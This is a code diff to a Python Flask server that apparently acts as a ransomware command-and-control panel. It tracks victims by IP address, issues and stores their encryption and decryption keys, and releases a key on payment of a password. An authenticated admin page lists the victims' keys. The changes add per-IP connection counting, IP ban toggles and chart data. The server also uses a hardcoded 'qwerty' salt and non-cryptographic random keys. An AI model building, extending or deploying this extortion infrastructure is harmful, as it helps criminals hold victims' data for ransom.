@@ -23,6 +23,22 @@ liste_cookie = []
 global symetric_keys
 symetric_keys = {}
 
+global conn
+conn = {}
+
+global switchs_ban
+switchs_ban = {}
+
+def banned(ip):
+    global switchs_ban
+    if ip.replace(".","") in switchs_ban.keys():
+        if switchs_ban[ip.replace(".","")]==1:
+            return True
+    return False
+
+def gen_color():
+    return f"rgba({random.randint(0,255)},{random.randint(0,255)},{random.randint(0,255)},0.6)"
+
 def hash_pass(passw):
     dk = hashlib.pbkdf2_hmac('sha256', bytes(str(base64.b64encode(bytes(passw,"utf-8"))),'utf-8'), bytes(str("qwerty"),"utf-8"), 100000)
     passwd = dk.hex()
@@ -43,6 +59,11 @@ def generate_cookie(username):
 app = Flask(__name__)
 @app.route("/")
 def index():
+    global conn
+    if request.remote_addr in conn.keys():
+        conn[request.remote_addr]+=1
+    else:
+        conn[request.remote_addr]=1
     if not "Python" in str(request.user_agent):
         return redirect("/admin/",code=302)
     if request.remote_addr not in ransom_keys.keys():
@@ -76,6 +97,11 @@ def index():
 
 @app.route("/decrypt")
 def decrypt():
+    global conn
+    if request.remote_addr in conn.keys():
+        conn[request.remote_addr]+=1
+    else:
+        conn[request.remote_addr]=1
     password = request.args.get('pass')
     if request.remote_addr in ransom_keys.keys() and password == decryption_keys[request.remote_addr]:
         return ransom_keys[request.remote_addr][1]
@@ -84,6 +110,11 @@ def decrypt():
 
 @app.route("/get_sym")
 def symetric():
+    global conn
+    if request.remote_addr in conn.keys():
+        conn[request.remote_addr]+=1
+    else:
+        conn[request.remote_addr]=1
     liste_char = [i for i in "1234567890"]
     key = "".join([random.choice(liste_char) for _ in range(24)])
     global symetric_keys
@@ -92,6 +123,11 @@ def symetric():
 
 @app.route("/get_hash")
 def get_hash():
+    global conn
+    if request.remote_addr in conn.keys():
+        conn[request.remote_addr]+=1
+    else:
+        conn[request.remote_addr]=1
     if not request.remote_addr in decryption_keys.keys():
         key = "".join([str(random.randint(0,9)) for _ in range(500)])
         print(key)
@@ -104,9 +140,22 @@ def get_hash():
 
 @app.route("/delete_key/<int:key>/")
 def delete_key(key):
+    if banned(request.remote_addr):
+        return render_template("disallow.html")
     global ransom_keys
     global decryption_keys
     global symetric_keys
+    global conn
+    if request.remote_addr in conn.keys():
+        conn[request.remote_addr]+=1
+    else:
+        conn[request.remote_addr]=1
+    if request.method=="GET":
+        if request.cookies.get("keep_connected"):
+            if request.cookies.get("keep_connected") not in liste_cookie:
+                return redirect("/admin/",code=302)
+        else:
+            return redirect("/admin/",code=302)
 
     new_ransom_keys = {}
     for i in ransom_keys.keys():
@@ -130,19 +179,39 @@ def delete_key(key):
 
 @app.route("/admin/",methods=["POST","GET"])
 def admin_panel():
+    if banned(request.remote_addr):
+        return render_template("disallow.html")
     global ransom_keys
     global decryption_keys
     global ALLOWED_USERS
     global liste_cookie
     global symetric_keys
+    global conn
+    global switchs_ban
+    print(switchs_ban)
+    if request.remote_addr in conn.keys():
+        conn[request.remote_addr]+=1
+    else:
+        conn[request.remote_addr]=1
     if request.method=="GET":
         if request.cookies.get("keep_connected"):
             if request.cookies.get("keep_connected") in liste_cookie:
+                for i in conn.keys():
+                    if i.replace(".","") not in switchs_ban:
+                        switchs_ban[i.replace(".","")]=0
                 ransom_keys_return = {i:[str(ransom_keys[i][0]).replace("\\n","<br/>"),str(ransom_keys[i][1]).replace("\\n","<br/>")] for i in ransom_keys.keys()}
                 username = request.cookies.get("keep_connected").split("$")[1]
-                return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys)
+                colors = [gen_color() for _ in conn.keys()]
+                values = [int(i) for i in conn.values()]
+                keys = [str(i) for i in conn.keys()]
+                return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys,conn=conn,colors=colors,keys=keys,values=values,bans=switchs_ban)
         return render_template("login.html")
     elif request.method=="POST":
+        if request.cookies.get("keep_connected"):
+            if request.cookies.get("keep_connected") in liste_cookie:
+                for i in conn.keys():
+                    switchs_ban[i.replace(".","")]=[1 if request.values.get(i.replace(".",""))=="on" else 0][0]
+                return redirect("/admin/",code=302)
         username = request.values.get("username")
         password = request.values.get("password")
         if username in ALLOWED_USERS.keys():
@@ -151,7 +220,10 @@ def admin_panel():
                 #return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return)
                 expire_date = datetime.datetime.now()
                 expire_date = expire_date + datetime.timedelta(hours=1)
-                res = make_response(render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys))
+                colors = [gen_color() for _ in conn.keys()]
+                values = [int(i) for i in conn.values()]
+                keys = [str(i) for i in conn.keys()]
+                res = make_response(render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys,conn=conn,colors=colors,keys=keys,values=values,bans=switchs_ban))
                 res.set_cookie('keep_connected', generate_cookie(username), expires=expire_date)
                 return res
 
